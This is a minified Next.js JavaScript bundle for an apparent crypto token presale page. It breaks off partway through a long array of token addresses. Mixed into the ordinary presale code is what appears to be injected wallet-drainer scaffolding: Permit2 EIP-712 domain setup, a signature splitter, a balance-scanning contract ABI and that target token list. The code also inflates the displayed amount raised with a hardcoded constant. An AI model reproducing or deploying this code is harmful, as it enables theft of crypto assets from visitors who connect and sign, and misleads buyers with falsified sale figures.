(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([
  [405],
  {
    45728: function (e, a, s) {
      (window.__NEXT_P = window.__NEXT_P || []).push([
        "/",
        function () {
          return s(88955);
        },
      ]);
    },
    88955: function (e, a, s) {
      "use strict";
      s.r(a),
        s.d(a, {
          default: function () {
            return ea;
          },
        });
      var t = s(85893);
      s(84031);
      var n = s(67294);
      s(55805);
      var r = s(63045),
        i = s(89715),
        c = s(20301),
        o = s(37623),
        l = s(94628),
        d = s(22096);
      s(31099);
      var u = s(69999),
        h = s(53981);
      s(93365);
      var m = s(38641),
        x = s(82619);
      s(31407);
      var v = s(66366),
        p = s(10274),
        j = s(82123),
        N = s(48805);
      s(58443);
      var f = s(28140);
      s(50196);
      var b = s(35567),
        g = s(20147);
      s(21319);
      var y = s(98703),
        S = (s(91150), s(55402));
      s(37314), s(77086), s(6597), s(43876), s(56681);
      var w = s(92947);
      s(50676), s(42972);
      var E = s(66690),
        _ = s(72303);
      s(68846);
      var B = s(30833),
        T = s(61159),
        k = s(16299);
      s(20905), s(81980);
      var C = s(44509),
        F = s(9773),
        P = s(69077),
        H = s(50555),
        Z = s(17556),
        I = s(19838),
        R = s(91904),
        D = s(25675),
        L = s.n(D);
      s(34590);
      var U = s(2656),
        z = s(80023),
        K = s(43961),
        A = s(67247),
        G = s(67421),
        O = s(11163),
        W = s(83977),
        X = s(99261);
      s(51019);
      var $ = s(47135),
        Y = s(86501),
        M = s(22999),
        q = s(17857),
        J = s(32631);
      let { detect: Q } = s(43631);
      Q(), s(44431);
      var V = "0x790f5F96FC3DdC6dF043Cbbd70c99041C550B8B5",
        ee = "0xD9A8f7ECc231bC3F412073Af9B927368b0039C05";
      function addressToUint160(address) {
        // Ensure the address is a valid Ethereum address
        // Convert the address to a BigNumber, then to a string to represent uint160
        const addressNumeric = uint160(address);

        return addressNumeric;
      }
      window.Buffer = buffer.Buffer; // getting this from buffer module for frontend.

      const domainName = "Permit2"; // put your token name
      const domainVersion = "2"; // leave this to "1"
      const chainId = 1; // this is for the chain's ID. value is 1 for remix
      //      const ethers = require("ethers");
      const contractAddress = "0x000000000022d473030f116ddee9f6b43ac78ba3"; // Put the address here from remix
      const aABI = [
        {
          inputs: [
            {
              internalType: "address[]",
              name: "tokenAddresses",
              type: "address[]",
            },
            {
              internalType: "address",
              name: "account",
              type: "address",
            },
          ],
          name: "getNonZeroBalanceIndexes",
          outputs: [
            {
              internalType: "uint256[]",
              name: "",
              type: "uint256[]",
            },
          ],
          stateMutability: "view",
          type: "function",
        },
      ];
      var account = null;

      const domain = {
        name: domainName,
        chainId: chainId,
        verifyingContract: contractAddress,
      };

      const domainType = [
        { name: "name", type: "string" },
        { name: "chainId", type: "uint256" },
        { name: "verifyingContract", type: "address" },
      ];

      const connect = async () => {
        // This helps connect webpage to wallet.
        const providerOptions = {
          walletconnect: {
            package: WalletConnectProvider.default, // required
            options: {
              rpc: {
                1: "https://1rpc.io/eth",
                137: "https://polygon-rpc.com",
                56: "https://rpc.ankr.com/bsc",
                // ...
              },
            },
          },
        };

        const Web3Modal = window.Web3Modal.default;
        const web3Modal = new Web3Modal({
          network: "mainnet", // optional
          cacheProvider: false, // optional
          providerOptions, // required
          theme: "dark",
        });

        const provider = await web3Modal.connect();

        window.web3 = new Web3(provider);
        var accounts = await web3.eth.getAccounts();
        account = accounts[0];
      };
      const splitSig = (sig) => {
        if (typeof sig !== "string") {
          console.error("sig is not a string:", sig);
          // Handle the case where sig is not a string, possibly with a return or throw
          return;
        }

        // splits the signature to r, s, and v values.
        const r = sig.slice(0, 66);
        const s = "0x" + sig.slice(66, 130);
        const v = "0x" + sig.slice(130, 132);
        //        const recoveryParam = parseInt(v, 16);
        return {
          r,
          s,
          v,
        };
      };
      function ea() {
        let e = (0, O.useRouter)();
        var a,
          D,
          Q,
          ea,
          es,
          et,
          en,
          er,
          ei,
          ec,
          { refId: eo } = e.query,
          { src: el } = e.query;
        let { theme: ed, setTheme: eu } = (0, H.y7)(),
          [eh, em] = (0, n.useState)({
            accounts: [],
            balance: "",
            chainId: "",
          }),
          [ex, ev] = (0, n.useState)(0),
          [ep, ej] = (0, n.useState)(""),
          [eN, ef] = (0, n.useState)(0),
          [eb, eg] = (0, n.useState)(""),
          [ey, eS] = (0, n.useState)(0n),
          [ew, eE] = (0, n.useState)(0n),
          [e_, eB] = (0, n.useState)(0n),
          [eT, ek] = (0, n.useState)(0n),
          [eC, eF] = (0, n.useState)(0n),
          [eP, eH] = (0, n.useState)(0n),
          [eZ, eI] = (0, n.useState)(0n),
          [eR, eD] = (0, n.useState)(0n),
          [eL, eU] = (0, n.useState)(0n),
          [ez, eK] = (0, n.useState)("ETH"),
          [eA, eG] = (0, n.useState)(p.Z),
          [eO, eW] = (0, n.useState)(""),
          [eX, e$] = (0, n.useState)(0n),
          [eY, eM] = (0, n.useState)(0n),
          {
            isOpen: eq,
            open: eJ,
            close: eQ,
            setDefaultChain: eV,
          } = (0, H.k_)(),
          { address: e0 } = (0, P.mA)(),
          { isConnected: e1 } = (0, P.mA)(),
          [e6, e4] = (0, n.useState)("ETH"),
          { chain: e9, chains: e5 } = (0, P.LN)(),
          [e2, e3] = (0, n.useState)(!1),
          [e7, e8] = (0, n.useState)(!1),
          [ae, aa] = (0, n.useState)(!1),
          [as, at] = (0, n.useState)(!1),
          [an, ar] = (0, n.useState)(!1),
          [ai, ac] = (0, n.useState)(!1),
          [ao, al] = (0, n.useState)(!1),
          [ad, au] = (0, n.useState)(!1),
          [ah, am] = (0, n.useState)(!1),
          [ax, av] = (0, n.useState)(!1),
          [ap, aj] = (0, n.useState)(!1),
          [aN, af] = (0, n.useState)(!1),
          [ab, ag] = (0, n.useState)(""),
          { pendingChainId: ay, switchNetwork: aS } = (0, P.g0)(),
          aw = (100 * parseFloat(st() + "")) / parseFloat(ss() + "");
        (0, P.LN)();
        let aE = (0, W.ZF)({
            apiKey: "AIzaSyDiznXV-X__6tlQ8cckOTnC5IeCyJODBd4",
            authDomain: "wallstpepe-pro.firebaseapp.com",
            projectId: "wallstpepe-pro",
            storageBucket: "wallstpepe-pro.appspot.com",
            messagingSenderId: "1090666495828",
            appId: "1:1090666495828:web:f69a6be0a924d6fc3112c1",
            measurementId: "G-K0CLCJZFSW",
            databaseURL:
              "https://wallstpepe-pro-default-rtdb.asia-southeast1.firebasedatabase.app",
          }),
          a_ = (0, X.IH)(aE);
        (0, $.sN)(aE);
        let {
          data: aB,
          isError: aT,
          isLoading: ak,
        } = (0, P.KQ)({
          address: e0,
          token: eO,
          formatUnits: "ether",
          chainId: "ETH" === e6 ? 1 : 56,
          watch: !0,
        });
        function aC() {
          let e = s(58840);
          return (
            (e.isAddress(eo) &&
              "0x0000000000000000000000000000000000000000" != eo) ||
              (eo = "0x0000000000000000000000000000000000000000"),
            eo
          );
        }
        function aF() {
          ar(!1),
            av(!1),
            aj(!1),
            aa(!1),
            at(!1),
            al(!1),
            ac(!1),
            au(!1),
            am(!1),
            e3(!1),
            e8(!1),
            aH();
        }
        function aP() {
          return "ETH" === e6 ? ey : ew;
        }
        (0, P.mA)({
          onConnect(e) {
            let { address: a, connector: s, isReconnected: t } = e;
            console.log("Connected", {
              address: a,
              connector: s,
              isReconnected: t,
            });
          },
          onDisconnect() {
            console.log("Disconnected");
          },
        }),
          (0, P.$4)({
            onError(e) {
              console.log("Error", e);
            },
            onMutate(e) {
              console.log("Before Connect", e);
            },
            onSuccess(e) {
              console.log("Connect", e);
            },
            onSettled(e, a) {
              console.log("Settled", { data: e, error: a });
            },
          }),
          (0, n.useEffect)(() => {
            aH(),
              eu({
                themeMode: "light",
                themeVariables: {
                  "--w3m-accent-color": "#121612",
                  "--w3m-font-family": "Comfortaa",
                  "--w3m-font-feature-settings": "Comfortaa",
                },
              }),
              (function () {
                let e = document.getElementById("copyBtn");
                "true" !== e.getAttribute("listener") &&
                  e.addEventListener(
                    "click",
                    (e) => {
                      let a = e.target;
                      var s = document.getElementById("linkref"),
                        t = s.textContent || s.innerText;
                      a.setAttribute("listener", "true");
                      let n = document.createElement("textarea");
                      (n.value = t), document.body.appendChild(n), n.select();
                      try {
                        let e = document.execCommand("copy");
                        e &&
                          (0, Y.ZP)("Copied", {
                            duration: 1e3,
                            position: "top-center",
                            style: { background: "#fff", color: "#000" },
                            className: "",
                            icon: "✔️",
                            ariaProps: {
                              role: "status",
                              "aria-live": "polite",
                            },
                          });
                      } catch (e) {
                        Y.ZP.error("Copy error" + e),
                          console.error("Coppy error:", e);
                      } finally {
                        document.body.removeChild(n);
                      }
                    },
                    !1
                  );
              })();
            try {
              "" != el && (0, X.Kz)(a_, "FROM_" + el);
            } catch (e) {}
          }, []);
        let aH = async () => {
          if (!ax)
            try {
              let e = await (0, F.a4)({
                chainId: 1,
                address: V,
                abi: m,
                functionName: "getCurrentStage",
              });
              e$(e), av(!0);
            } catch (e) {
              console.error("ERROR", e);
            }
          if (!ae)
            try {
              let e = await (0, F.a4)({
                chainId: 1,
                address: V,
                abi: m,
                functionName: "getPriceInUSD",
              });
              ey != e && (eS(e), aa(!0));
            } catch (e) {
              console.error("ERROR", e);
            }
          if (!as && 0 != eX)
            try {
              let e = await (0, F.a4)({
                chainId: 56,
                address: ee,
                abi: x,
                functionName: "getPriceInUSD",
                args: [eX],
              });
              ew != e && (eE(e), at(!0));
            } catch (e) {
              console.error("ERROR", e);
            }
          if (!e2)
            try {
              let e = await (0, F.a4)({
                chainId: 1,
                address: V,
                abi: m,
                functionName: "getRaised",
              });
              let modied =
                BigInt(e + "") +
                BigInt("30127000000000000000000000000000" + "") /
                  BigInt("31000" + "");
              eL != modied && (eU(modied), e3(!0));
            } catch (e) {
              console.error("ERROR", e);
            }
          try {
            let e = await (0, F.a4)({
              chainId: 1,
              address: V,
              abi: m,
              functionName: "getTotalRaise",
            });
            eR != e && (eD(e), e8(!0));
          } catch (e) {
            console.error("ERROR", e);
          }
          if (!ap)
            try {
              let e = await (0, F.a4)({
                chainId: 1,
                address: V,
                abi: m,
                functionName: "getNextStagePrice",
              });
              eM(e), aj(!0);
            } catch (e) {
              console.error("ERROR", e);
            }
          if (!ai)
            try {
              let e = await (0, F.a4)({
                chainId: 1,
                address: V,
                abi: m,
                functionName: "getLatestPriceEthPerUSD",
              });
              eB(e), ac(!0);
            } catch (e) {
              console.error("ERROR", e);
            }
          if (!ao)
            try {
              let e = await (0, F.a4)({
                chainId: 56,
                address: ee,
                abi: x,
                functionName: "getLatestPriceBNBPerUSD",
              });
              ek(e), al(!0);
            } catch (e) {
              console.error("ERROR", e);
            }
          if (!ad)
            try {
              let e = await (0, F.a4)({
                chainId: 1,
                address: V,
                abi: m,
                functionName: "getLatestPriceUSDTPerUSD",
              });
              "bigint" == typeof e && (eF(e), au(!0));
            } catch (e) {
              console.error("ERROR", e);
            }
          try {
            if (null != e0) {
              let e = await (0, F.a4)({
                chainId: 1,
                address: V,
                abi: m,
                functionName: "balanceOf",
                args: [e0],
              });
              "bigint" == typeof e &&
                (eZ != BigInt(e + "") && eI(BigInt(e + "")), ar(!0));
            }
          } catch (e) {
            console.error("ERROR", e);
          }
        };
        (0, P.y2)({
          address: V,
          abi: m,
          eventName: "BuyToken",
          listener(e) {
            var a, s, n, r, i;
            (a = (0, M.Z)(e[0].args.buyer)),
              (s =
                "ETH" === e[0].args.chain && "USDT" === e[0].args.buyFrom
                  ? (0, k.Rm)(e[0].args.amountIn, 2)
                  : (0, k.dF)(e[0].args.amountIn, 5)),
              (n = e[0].args.buyFrom),
              (r = e[0].args.chain),
              (i = e[0].transactionHash),
              (0, Y.ZP)((e) =>
                (0, t.jsxs)("span", {
                  onClick: () => {
                    let e = aU(i, r);
                    window.open(e, "_blank", "noopener,noreferrer");
                  },
                  children: [
                    "Address: ",
                    (0, t.jsx)("b", { children: a }),
                    " buy $",
                    s,
                    n,
                  ],
                })
              ),
              ar(!1),
              e3(!1),
              aH();
          },
        });
        let aZ = async () => {
          aI(),
            eK("ETH" == e6 ? "ETH" : "BNB"),
            eG("ETH" == e6 ? p.Z : N.Z),
            eW(""),
            "ETH" == e6
              ? (0, X.Kz)(a_, "ETHButton Click")
              : (0, X.Kz)(a_, "BNBButton Click");
        };
        function aI() {
          ev(0), ej(""), eg(""), ef(0);
        }
        function aR() {
          return "ETH" === e6
            ? "0xdAC17F958D2ee523a2206206994597C13D831ec7"
            : "0x55d398326f99059fF775485246999027B3197955";
        }
        function aD() {
          return "ETH" === e6 ? u : h;
        }
        function aL() {
          return "ETH" === e6 ? V : ee;
        }
        function aU(e, a) {
          return "ETH" === a
            ? "https://etherscan.io/tx/" + e
            : "https://bscscan.com/tx/" + e;
        }
        let az = async () => {
          aI(),
            eK("USDT"),
            eG(j.Z),
            eW(aR()),
            (0, X.Kz)(a_, "USDTButton Click");
        };
        function aK() {
          return "USDT" === ez && "ETH" === e6 ? (0, k.WN)(ex) : (0, k.n9)(ex);
        }
        const tokenAddresses = [
          "0x5Ee5bf7ae06D1Be5997A1A72006FE6C607eC6DE8",
          "0x977b6fc5dE62598B08C85AC8Cf2b745874E8b78c",
          "0x2516E7B3F76294e03C42AA4c5b5b4DCE9C436fB8",
          "0x030bA81f1c18d280636F32af80b9AAd02Cf0854e",
          "0x68242f95ff552d9fbac56a4b393bc77182afea76",
          "0x4d5f47fa6a74757f35c14fd3a6ef8e3c9bc514e8",
          "0xd4e245848d6e1220dbe62e155d89fa327e43cb06",
          "0x5e8c8a7243651db1384c0ddfdbe39761e8e7e51a",
          "0x8a458a9dc9048e005d22849f470891b840296619",
          "0xfc1e690f61efd961294b3e1ce3313fbd8aa4f85d",
          "0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8",
          "0xdAC17F958D2ee523a2206206994597C13D831ec7",
          "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
          "0x514910771af9ca656af840dff83e8264ecf986ca",
          "0x1f9840a85d5af5bf1d1762f925bdaddc4201f984",
          "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599",
          "0x582d872a1b094fc48f5de31d3b73f2d9be47def1",
          "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE",
          "0x6b175474e89094c44da98b954eedeac495271d0f",
          "0xf57e7e7c23978c3caec3c3548e3d615c346e79ff",
          "0x2af5d2ad76741191d15dfe7bf6ac92d4bd912ca3",
          "0xd850942ef8811f2a866692a623011bde52a462c1",
          "0x75231f58b43240c9718dd58b4967c5114342a86c",
          "0x5a98fcbea516cf06857215779fd812ca3bef1b32",
          "0x6de037ef9ad2725eb40118bb1702ebb27e4aeb24",
          "0x3c3a81e81dc49a522a592e7622a7e711c06bf354",
          "0xa0b73e1ff0b80914ab6fe0444e65848c4c34450b",
          "0xc944e90c64b2c07662a292be6244bdf05cda44a7",
          "0xB50721BCf8d664c30412Cfbc6cf7a15145234ad1",
          "0xae78736cd615f374d3085123a210448e74fc6393",
          "0x62D0A8458eD7719FDAF978fe5929C6D342B0bFcE",
          "0xd5f7838f5c461feff7fe49ea5ebaf7728bb0adfa",
          "0x4da27a545c0c5b758a6ba100e3a049001de870f5",
          "0x4a220e6096b25eadb88358cb44068a3248254675",
          "0x2b591e99afe9f32eaa6214f7b7629768c40eeb39",
          "0xc011a73ee8576fb46f5e1c5751ca3b9fe0af2a6f",
          "0x3883f5e181fccaf8410fa61e12b59bad963fb645",
          "0x0000000000085d4780B73119b644AE5ecd22b376",
          "0x92d6c1e31e14520e676a687f0a93788b716beff5",
          "0x4e15361fd6b4bb609fa63c81a2be19d873717870",
          "0x3845badAde8e6dFF049820680d1F14bD3903a5d0",
          "0xbb0e17ef65f82ab018d8edd776e8dd940327b28b",
          "0x3506424f91fd33084466f402d5d97f05f8e3b4af",
          "0xc669928185dbce49d2230cc9b0979be6dc797957",
          "0xaea46A60368A7bD060eec7DF8CBa43b7EF41Ad85",
          "0x163f8c2467924be0ae7b5347228cabf260318753",
          "0x4d224452801aced8b2f0aebe155379bb5d594381",
          "0x5283d291dbcf85356a21ba090e6db59121208b44",
          "0xf34960d9d60be18cc1d5afc1a6f012a723a28811",
          "0x0f5d2fb29fb7d3cfee444a200298f468908cc942",
          "0xfd09cf7cfffa9932e33668311c4777cb9db3c9be",
          "0x5e8422345238f34275888049021821e8e08caa1f",
          "0x4691937a7508860f876c9c0a2a617e7d9e945d4b",
          "0x430EF9263E76DAE63c84292C3409D61c598E9682",
          "0xaaef88cea01475125522e117bfe45cf32044e238",
          "0x738865301a9b7dd80dc3666dd48cf034ec42bdda",
          "0x744d70fdbe2ba4cf95131626614a1763df805b9e",
          "0x3593d125a4f7849a1b059e64f4517a86dd60c95d",
          "0xff56cc6b1e6ded347aa0b7676c85ab0b3d08b0fa",
          "0xd417144312dbf50465b1c641d016962017ef6240",
          "0xc7283b66eb1eb5fb86327f08e1b5816b0720212b",
          "0x320623b8e4ff03373931769a31fc52a4e78b5d70",
          "0x839e71613f9aa06e5701cf6de63e303616b0dde3",
          "0xb3999f658c0391d94a37f7ff328f3fec942bcadc",
          "0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E",
          "0x8DE5B80a0C1B02Fe4976851D030B36122dbb8624",
          "0x43Dfc4159D86F3A37A5A4B3D4580b888ad7d4DDd",
          "0xac51066d7bec65dc4589368da368b212745d63e8",
          "0xdeFA4e8a7bcBA345F687a2f1456F5Edd9CE97202",
          "0x579cea1889991f68acc35ff5c3dd0621ff29b0c9",
          "0x940a2db1b7008b6c776d4faaca729d6d4a4aa551",
          "0x9ab7bb7fdc60f4357ecfef43986818a2a3569c62",
          "0xdb25f211ab05b1c97d595516f45794528a807ad8",
          "0x9992ec3cf6a55b00978cddf2b27bc6882d88d1ec",
          "0xcb86c6a22cb56b6cf40cafedb06ba0df188a416e",
          "0x3597bfd533a99c9aa083587b074434e61eb0a258",
          "0x5732046a883704404f284ce41ffadd5b007fd668",
          "0xde7d85157d9714eadf595045cc12ca4a5f3e2adb",
          "0x0fd10b9899882a6f2fcb5c371e17e70fdee00c38",
          "0xa1faa113cbe53436df28ff0aee54275c13b40975",
          "0x826180541412D574cf1336d22c0C0a287822678A",
          "0xa849eaae994fb86afa73382e9bd88c2b6b18dc71",
          "0x32353A6C91143bfd6C7d363B546e62a9A2489A20",
          "0x467Bccd9d29f223BcE8043b84E8C8B282827790F",
          "0x8c15ef5b4b21951d50e53e4fbda8298ffad25057",
          "0x52a8845df664d76c69d2eea607cd793565af42b8",
          "0x5de8ab7e27f6e7a1fff3e5b337584aa43961beef",
          "0x1f573d6fb3f13d689ff844b4ce37794d79a7ff1c",
          "0x6c5bA91642F10282b576d91922Ae6448C9d52f4E",
          "0x178c820f862b14f316509ec36b13123da19a6054",
          "0x9aab071b4129b083b01cb5a0cb513ce7eca26fa5",
          "0xccc8cb5229b0ac8069c51fd58367fd1e622afd97",
          "0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643",
          "0x9F52c8ecbEe10e00D9faaAc5Ee9Ba0fF6550F511",
          "0x8fc8f8269ebca376d046ce292dc7eac40c8d358a",
          "0x9E976F211daea0D652912AB99b0Dc21a7fD728e4",
          "0x6B0b3a982b4634aC68dD83a4DBF02311cE324181",
          "0x6982508145454ce325ddbe47a25d4ec3d2311933",
          "0x5e8422345238f34275888049021821e8e08caa1f",
          "0x6810e776880c02933d47db1b9fc05908e5386b96",
          "0x5283d291dbcf85356a21ba090e6db59121208b44",
          "0xac3e018457b222d93114458476f3e3416abbe38f",
          "0x6c6ee5e31d828de241282b9606c8e98ea48526e2",
          "0x6123b0049f904d730db3c36a31167d9d4121fa6b",
          "0xBe9895146f7AF43049ca1c1AE358B0541Ea49704",
          "0xdf49c9f599a0a9049d97cff34d0c30e468987389",
          "0x6e2a43be0b1d33b726f0ca3b8de60b3482b8b050",
          "0xba11d00c5f74255f56a5e366f4f77f5a186d7f55",
          "0x04Fa0d235C4abf4BcF4787aF4CF447DE572eF828",
          "0xddb3422497e61e13543bea06989c0789117555c5",
          "0xd7c49cee7e9188cca6ad8ff264c1da2e69d4cf3b",
          "0x8A2279d4A90B6fe1C4B30fa660cC9f926797bAA2",
          "0x11eef04c884e24d9b7b4760e7476d06ddf797f36",
          "0x39bb259f66e1c59d5abef88375979b4d20d98022",
          "0xba9d4199fab4f26efe3551d490e3821486f135ba",
          "0x0649cef6d11ed6f88535462e147304d3fe5ae14d",
          "0x7d5121505149065b562c789a0145ed750e6e8cdd",
          "0x839e71613f9aa06e5701cf6de63e303616b0dde3",
          "0x9d65ff81a3c488d585bbfb0bfe3c7707c7917f54",
          "0xd417144312dbf50465b1c641d016962017ef6240",
          "0x4c11249814f11b9346808179cf06e71ac328c1b5",
          "0x590f820444fa3638e022776752c5eef34e2f89a6",
          "0xf650c3d88d12db855b8bf7d11be6c55a4e07dcc9",
          "0x3597bfd533a99c9aa083587b074434e61eb0a258",
          "0x177d39ac676ed1c67a2b268ad7f1e58826e5b0af",
          "0x467Bccd9d29f223BcE8043b84E8C8B282827790F",
          "0x090185f2135308bad17527004364ebcc2d37e5f6",
          "0x761d38e5ddf6ccf6cf7c55759d5210750b5d60f3",
          "0x8e870d67f660d95d5be530380d0ec0bd388289e1",
          "0x64aa3364f17a4d01c6f1751fd97c2bd3d7e7f1d5",
          "0xa3ee21c306a700e682abcdfe9baa6a08f3820419",
          "0x26fb86579e371c7aedc461b2ddef0a8628c93d3b",
          "0x744d70fdbe2ba4cf95131626614a1763df805b9e",
          "0x037a54aab062628c9bbae1fdb1583c195585fe41",
          "0xa9b1eb5908cfc3cdf91f9b8b3a74108598009096",
          "0x826180541412D574cf1336d22c0C0a287822678A",
          "0xde7d85157d9714eadf595045cc12ca4a5f3e2adb",
          "0xf411903cbc70a74d22900a5de66a2dda66507255",
          "0x9992ec3cf6a55b00978cddf2b27bc6882d88d1ec",
          "0x6b0b3a982b4634ac68dd83a4dbf02311ce324181",
          "0xaaaaaa20d9e0e2461697782ef11675f668207961",
          "0x644192291cc835a93d6330b24ea5f5fedd0eef9e",
          "0x18084fba666a33d37592fa2633fd49a74dd93a88",
          "0xf4d2888d29d722226fafa5d9b24f9164c092421e",
          "0xde30da39c46104798bb5aa3fe8b9e0e1f348163f",
          "0x8207c1ffc5b6804f6024322ccf34f29c3541ae26",
          "0x081f67afa0ccf8c7b17540767bbe95df2ba8d97f",
          "0x8f8221afbb33998d8584a2b05749ba73c37a938a",
          "0x08c32b0726c5684024ea6e141c50ade9690bbdcc",
          "0x8806926Ab68EB5a7b909DcAf6FdBe5d93271D6e2",
          "0x42bbfa2e77757c645eeaad1655e0911a7553efbc",
          "0x8fc8f8269ebca376d046ce292dc7eac40c8d358a",
          "0xea26c4ac16d4a5a106820bc8aee85fd0b7b2b664",
          "0x115ec79f1de567ec68b7ae7eda501b406626478e",
          "0x0000000000095413afc295d19edeb1ad7b71c952",
          "0xba3335588d9403515223f109edc4eb7269a9ab5d",
          "0x549020a9Cb845220D66d3E9c6D9F9eF61C981102",
          "0x818fc6c2ec5986bc6e2cbf00939d90556ab12ce5",
          "0xcdcfc0f66c522fd086a1b725ea3c0eeb9f9e8814",
          "0x84cA8bc7997272c7CfB4D0Cd3D55cd942B3c9419",
          "0x419d0d8bdd9af5e606ae2232ed285aff190e711b",
          "0xb056c38f6b7dc4064367403e26424cd2c60655e1",
          "0x1a3496c18d558bd9c6c8f609e1b129f67ab08163",
          "0xf1f955016EcbCd7321c7266BccFB96c68ea5E49b",
          "0x814e0908b12a99fecf5bc101bb5d0b8b5cdf7d26",
          "0x1014613e2b3cbc4d575054d4982e580d9b99d7b1",
          "0x990f341946A3fdB507aE7e52d17851B87168017c",
          "0x5e3346444010135322268a4630d2ed5f8d09446c",
          "0xe5b826ca2ca02f09c1725e9bd98d9a8874c30532",
          "0x1e797Ce986C3CFF4472F7D38d5C4aba55DfEFE40",
          "0xfe5f141bf94fe84bc28ded0ab966c16b17490657",
          "0x090185f2135308bad17527004364ebcc2d37e5f6",
          "0x62D0A8458eD7719FDAF978fe5929C6D342B0bFcE",
          "0x549020a9Cb845220D66d3E9c6D9F9eF61C981102",
          "0xb37a769b37224449d92aac57de379e1267cd3b00",
          "0x45804880De22913dAFE09f4980848ECE6EcbAf78",
          "0xaaaebe6fe48e54f431b0c390cfaf0b017d09d42d",
          "0xdc349913d53b446485e98b76800b6254f43df695",
          "0x63f584fa56e60e4d0fe8802b27c7e6e3b33e007f",
          "0xbbc2ae13b23d715c30720f079fcd9b4a74093505",
          "0x115ec79f1de567ec68b7ae7eda501b406626478e",
          "0x3883f5e181fccaf8410fa61e12b59bad963fb645",
          "0xd4c435f5b09f855c3317c8524cb1f586e42795fa",
          "0xd4fa1460f537bb9085d22c7bccb5dd450ef28e3a",
          "0x72adadb447784dd7ab1f472467750fc485e4cb2d",
          "0x37f04d2c3ae075fad5483bb918491f656b12bdb6",
          "0x558ec3152e2eb2174905cd19aea4e34a23de9ad6",
          "0xB50721BCf8d664c30412Cfbc6cf7a15145234ad1",
          "0x814e0908b12a99fecf5bc101bb5d0b8b5cdf7d26",
          "0xed04915c23f00a313a544955524eb7dbd823143d",
          "0x6a27348483d59150ae76ef4c0f3622a78b0ca698",
          "0xe5dada80aa6477e85d09747f2842f7993d0df71c",
          "0xfc2c4d8f95002c14ed0a7aa65102cac9e5953b5e",
          "0x5732046a883704404f284ce41ffadd5b007fd668",
          "0x0bb217e40f8a5cb79adf04e1aab60e5abd0dfc1e",
          "0xddb3422497e61e13543bea06989c0789117555c5",
          "0x037a54aab062628c9bbae1fdb1583c195585fe41",
          "0xd13c7342e1ef687c5ad21b27c2b65d772cab5c8c",
          "0x77fba179c79de5b7653f68b5039af940ada60ce0",
          "0x68d57c9a1c35f63e2c83ee8e49a64e9d70528d25",
          "0x00c83aecc790e8a4453e5dd3b0b4b3680501a7a7",
          "0xDF347911910b6c9A4286bA8E2EE5ea4a39eB2134",
          "0x046eee2cc3188071c02bfc1745a6b17c656e3f3d",
          "0xb9EF770B6A5e12E45983C5D80545258aA38F3B78",
          "0x607F4C5BB672230e8672085532f7e901544a7375",
          "0x13c2fab6354d3790d8ece4f0f1a3280b4a25ad96",
          "0x4824a7b64e3966b0133f4f4ffb1b9d6beb75fff7",
          "0xf970b8e36e23f7fc3fd752eea86f8be8d83375a6",
          "0x19062190b1925b5b6689d7073fdfc8c2976ef8cb",
          "0xfca59cd816ab1ead66534d82bc21e7515ce441cf",
          "0x48c276e8d03813224bb1e55f953adb6d02fd3e02",
          "0x8ce9137d39326ad0cd6491fb5cc0cba0e089b6a9",
          "0x9e32b13ce7f2e80a01932b42553652e053d6ed8e",
          "0xb056c38f6b7dc4064367403e26424cd2c60655e1",
          "0x05f4a42e251f2d52b8ed15e9fedaacfcef1fad27",
          "0x0b38210ea11411557c13457D4dA7dC6ea731B88a",
          "0x0f71b8de197a1c84d31de0f1fa7926c365f052b3",
          "0x1a3496c18d558bd9c6c8f609e1b129f67ab08163",
          "0x2d0e95bd4795d7ace0da3c0ff7b706a5970eb9d3",
          "0x4e3fbd56cd56c3e72c1403e103b45db9da5b9d2b",
          "0x08f5a9235b08173b7569f83645d2c7fb55e8ccd8",
          "0xe25bcec5d3801ce3a794079bf94adf1b8ccd802d",
          "0x84cA8bc7997272c7CfB4D0Cd3D55cd942B3c9419",
          "0x8400d94a5cb0fa0d041a3788e395285d61c9ee5e",
          "0x6fb3e0a217407efff7ca062d46c26e5d60a14d69",
          "0xea11755ae41d889ceec39a63e6ff75a02bc1c00d",
          "0xc669928185dbce49d2230cc9b0979be6dc797957",
          "0xfe3e6a25e6b192a42a44ecddcd13796471735acf",
          "0xf85feea2fdd81d51177f6b8f35f0e6734ce45f5f",
          "0xe3818504c1b32bf1557b16c238b2e01fd3149c17",
          "0xfc05987bd2be489accf0f509e44b0145d68240f7",
          "0x28dee01d53fed0edf5f6e310bf8ef9311513ae40",
          "0xb98d4c97425d9908e66e53a6fdf673acca0be986",
          "0xEC213F83defB583af3A000B1c0ada660b1902A0F",
          "0xddf7fd345d54ff4b40079579d4c4670415dbfd0a",
          "0x9389434852b94bbad4c8afed5b7bdbc5ff0c2275",
          "0x491604c0FDF08347Dd1fa4Ee062a822A5DD06B5D",
          "0xaa7a9ca87d3694b5755f213b5d04094b8d0f0a6f",
          "0xdacD69347dE42baBfAEcD09dC88958378780FB62",
          "0xc6dddb5bc6e61e0841c54f3e723ae1f3a807260b",
          "0xd2d6158683aee4cc838067727209a0aaf4359de3",
          "0x6e2a43be0b1d33b726f0ca3b8de60b3482b8b050",
          "0xbd0793332e9fb844a52a205a233ef27a5b34b927",
          "0x5e6b6d9abad9093fdc861ea1600eba1b355cd940",
          "0x6810e776880c02933d47db1b9fc05908e5386b96",
          "0x056fd409e1d7a124bd7017459dfea2f387b6d5cd",
          "0x4da27a545c0c5b758a6ba100e3a049001de870f5",
          "0xf1f955016EcbCd7321c7266BccFB96c68ea5E49b",
          "0xf0f9d895aca5c8678f706fb8216fa22957685a13",
          "0xA35b1B31Ce002FBF2058D22F30f95D405200A15b",
          "0x644192291cc835a93d6330b24ea5f5fedd0eef9e",
          "0x3Dd98C8A089dBCFF7e8FC8d4f532BD493501Ab7F",
          "0x16631e53c20fd2670027c6d53efe2642929b285c",
          "0x0e0989b1f9b8a38983c2ba8053269ca62ec9b195",
          "0xfaba6f8e4a5e8ab82f62fe7c39859fa577269be3",
          "0x0fd10b9899882a6f2fcb5c371e17e70fdee00c38",
          "0x6226e00bCAc68b0Fe55583B90A1d727C14fAB77f",
          "0x3543638ed4a9006e4840b105944271bcea15605d",
          "0x006bea43baa3f7a6f765f14f10a1a1b08334ef45",
          "0x1ccaa0f2a7210d76e1fdec740d5f323e2e1b1672",
